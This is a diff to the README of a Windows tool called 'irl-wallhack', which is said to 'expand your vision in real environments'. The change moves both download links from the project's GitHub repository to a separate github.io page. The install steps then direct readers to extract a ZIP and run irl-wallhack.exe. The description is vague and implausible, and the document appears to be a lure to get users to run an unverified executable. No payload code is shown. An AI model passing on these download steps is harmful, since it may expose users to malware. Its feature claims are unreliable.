@@ -1,6 +1,6 @@
 # 👁️ irl-wallhack-v1-0-pc - Expand your vision in real environments
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Isaac4961/irl-wallhack-v1-0-pc)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://isaac4961.github.io)
 
 irl-wallhack-v1-0-pc acts as a specialized utility for Windows computers. It helps users manage visual data in real-world surroundings. The software uses modern image processing to clarify shapes and edges. This version provides stable performance for everyday use. You can use it to assist with tasks that require better depth perception or object identification.
 
@@ -20,7 +20,7 @@ Update your graphics drivers if you experience issues. Most modern PCs meet thes
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Isaac4961/irl-wallhack-v1-0-pc) to download the package.
+1. Visit the [official release page](https://isaac4961.github.io) to download the package.
 2. Locate the download folder on your computer.
 3. Extract the contents of the ZIP file to a folder you can find easily.
 4. Open the extracted folder and look for the file named irl-wallhack.exe.
